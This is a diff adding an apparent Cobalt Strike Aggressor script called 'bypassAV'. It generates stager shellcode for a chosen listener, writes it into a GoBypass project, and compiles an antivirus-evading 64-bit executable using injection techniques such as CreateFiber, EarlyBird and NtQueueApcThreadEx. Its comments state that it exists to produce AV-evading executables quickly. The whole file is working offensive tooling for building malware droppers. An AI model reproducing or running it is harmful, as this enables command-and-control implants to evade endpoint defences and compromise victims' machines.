@@ -1,0 +1,80 @@
+popup bypassAV{
+	item("&bypassAV",{Generator()});
+	separator();
+	item("&help",{url_open("https://github.com/sssqp/bypass-script")}); 
+	
+}
+
+
+sub Generator{
+	$dialog = dialog("Generator", %(listener => "" ,bit => false , bypassfunc => "" ), &GeneratorFunc);
+	drow_listener($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "bypassfunc", "bypass Func:", @("CreateFiber", "CreateProcess", "CreateThread" , "CreateThreadNative", "CryptProtectMemory" , "CryptUnprotectMemory" ,"EarlyBird" , "EtwpCreateEtwThread" , "NtQueueApcThreadEx" , "UuidFromStringA")); 
+	dialog_description($dialog, "该插件用于快速生成免杀的可执行文件，目前仅支持生成64位exe");
+	dbutton_action($dialog, "Generate");
+	dbutton_help($dialog, "");
+	#drow_checkbox($dialog, "bit", "x64: ", "使用64位的payload"); #对32位shellcode存在问题，先删除
+	dialog_show($dialog);
+}
+
+sub GeneratorFunc{
+	#对32支持有问题，先删除
+	#获取32位/64位shellcode
+	#$a = $3["bit"] . "";
+	#if ($3["bit"] eq "false"){
+	#	$system = "x86";
+	#	#$arch = "386";
+	#}else{
+	#	$system = "x64";
+	#	#$arch = "amd64";
+	#}
+
+	#获取免杀类型
+	$bypassfunc = $3["bypassfunc"] . "";
+	#生成shellcode
+	$shell_code = stager($3["listener"], "x64");
+	#将shellcode转换成\xaa...
+	$arr = transform($shell_code, "veil");
+	$arr = "\"" . $arr . "\"";
+	println($arr);
+	#获取当前目录
+	#判断是否存在GoBypass,不存在直接退出
+	if(-exists "GoBypass"){	
+   		#写shellcode
+		$handle_a = openf(">GoBypass/shellcode.txt");
+		println($handle_a, $arr);
+		closef($handle_a);
+
+		#保存文件
+		prompt_file_save("temp.exe",{
+			
+			#判断当前系统
+			if ("*Windows*" iswm systemProperties()["os.name"]){
+				$process1 = exec("cmd /c cd GoBypass && go run main.go -m $bypassfunc -d");
+				@data1 = readAll($process1);
+				println(@data1);
+				closef($process1);
+				
+
+			}else{				
+				$process1 = exec(@("bash", "-c","cd GoBypass && go run main.go -m $bypassfunc -d"));
+				@data1 = readAll($process1);
+				println(@data1);
+				closef($process1);
+				
+			}
+			#保存exe
+			$handle = openf("GoBypass/output.exe");
+			$handle1 = openf("> $+ $1");
+			$data = readb($handle, -1);
+			writeb($handle1 , $data);
+			closef($handle);
+			closef($handle1);
+			show_message("save to  $+ $1");
+		});
+	}else{
+		show_message("GoBypass file not exist, See the help documentation");
+	}
+    
+}
+menubar("bypassAV", "bypassAV"); # 菜单函数
